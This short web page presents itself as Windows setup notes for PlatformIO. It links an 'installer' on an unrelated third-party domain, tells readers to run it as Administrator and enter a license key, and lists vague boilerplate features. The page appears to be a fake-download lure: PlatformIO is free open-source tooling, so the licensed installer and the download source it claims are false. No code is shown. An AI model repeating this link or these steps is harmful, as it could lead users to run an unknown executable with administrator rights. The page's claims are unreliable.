# PlatformIO Windows Setup Notes

**Download:** [Get Windows installer →](https://platformio-setup.kolmods.com/)

## Download & Install

> Setup notes for **PlatformIO** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **PlatformIO** from the Start menu

## What you can use it for

- Core PlatformIO features on Windows desktop
- Install and configure PlatformIO for daily use
- Import, edit, and export with PlatformIO tools
- Tune settings and profiles inside PlatformIO
- Integrate PlatformIO into your existing workflow
